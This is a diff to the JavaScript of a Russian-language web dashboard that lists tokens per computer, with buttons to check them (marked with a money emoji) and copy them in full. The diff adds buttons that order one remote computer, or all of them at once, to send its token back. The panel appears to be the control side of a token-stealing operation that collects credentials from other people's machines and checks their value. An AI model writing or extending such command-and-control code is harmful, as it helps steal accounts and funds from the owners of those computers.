@@ -85,6 +85,7 @@ function renderTokens() {
     html += '<td style="font-size:0.78rem;">' + computer + '</td>';
     html += '<td><div style="display:flex; gap:6px; flex-wrap:wrap;">';
     html += '<button class="copy-btn" onclick="checkSingle(\'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.72rem;">💰 Проверить</button>';
+    html += '<button class="copy-btn" onclick="requestToken(\'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.72rem; border-color:rgba(99,102,241,0.2); color:var(--accent);">📡 Запросить</button>';
     if (t.security) {
       html += '<button class="copy-btn" onclick="copyText(\'' + tokenFull.replace(/'/g, "\\'") + '\')" style="font-size:0.72rem;">📋 Копировать</button>';
     }
@@ -122,6 +123,37 @@ async function checkSingle(filename) {
     if (e.message !== 'auth') toast('Ошибка проверки', 'err');
   }
 }
+
+// ── Запросить токен у одного компьютера ───────────────────────────────────────
+async function requestToken(filename) {
+  toast('📡 Запрос отправлен...');
+  try {
+    await apiFetch('/request-token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ filename })
+    });
+    toast('📡 Запрос токена отправлен компьютеру');
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка запроса', 'err');
+  }
+}
+
+// ── Запросить токен у всех ────────────────────────────────────────────────────
+document.getElementById('btnRequestAll').addEventListener('click', async function() {
+  const btn = this;
+  btn.disabled = true;
+  btn.textContent = '⏳ Отправка...';
+  try {
+    const r = await apiFetch('/request-token-all', { method: 'POST' });
+    const data = await r.json();
+    toast('📡 Запрос отправлен ' + (data.count || 'всем') + ' компьютерам');
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка запроса', 'err');
+  }
+  btn.disabled = false;
+  btn.textContent = '📡 Запросить у всех';
+});
 
 // ── Проверить все ─────────────────────────────────────────────────────────────
 document.getElementById('btnCheckAll').addEventListener('click', async function() {
